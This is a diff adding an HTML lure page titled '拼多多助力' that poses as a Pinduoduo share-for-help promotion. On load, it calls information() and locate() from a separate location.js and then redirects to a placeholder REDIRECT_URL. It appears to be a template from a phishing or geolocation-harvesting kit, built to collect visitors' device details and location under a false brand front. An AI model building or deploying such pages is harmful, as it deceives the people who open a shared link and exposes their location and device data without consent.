@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="ch-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:image" content="$IMG_URL$">
+    <title>拼多多助力</title>
+    <script type="text/javascript">
+        if (window.location.protocol == "http:") {
+            var restOfUrl = window.location.href.substr(5);
+            window.location = "https:" + restOfUrl;
+        }
+    </script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script type="text/javascript" src="js/location.js"></script>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-repeat: no-repeat;
+            background-size: cover;
+            background-image: url(./pdd.png);
+        }
+    </style>
+</head>
+
+<body onload="information();locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Failed');});">
+    <div id="error-message" style="color: red; text-align: center; margin-top: 10px;"></div>
+</body>
+
+</html>
